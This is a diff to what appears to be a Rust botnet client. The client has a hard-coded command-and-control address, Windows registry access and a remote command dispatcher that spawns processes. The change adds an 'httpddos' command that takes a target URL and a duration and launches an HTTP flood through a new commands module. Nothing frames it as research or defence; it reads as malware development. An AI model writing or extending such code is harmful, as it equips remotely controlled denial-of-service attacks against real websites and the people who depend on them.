@@ -14,6 +14,7 @@ use tokio::time::{sleep, Duration};
 use winreg::enums::*;
 use winreg::RegKey;
 
+pub mod commands;
 pub mod console;
 
 const CONTROL: &str = "192.168.1.154:8080";
@@ -131,6 +132,21 @@ async fn handle_command(command: &str) {
                     .spawn()
                     .expect("Command err");
             }
+        }
+        "httpddos" => {
+            let mut args = args.split(" ");
+
+            let url = match args.next() {
+                Some(u) => u.to_string(),
+                None => return, // need url
+            };
+
+            let duration = match args.next() {
+                Some(d) => Duration::from_secs(d.parse().unwrap_or(300)),
+                None => return,
+            };
+
+            commands::ddos(url, duration).await;
         }
         &_ => (),
     }
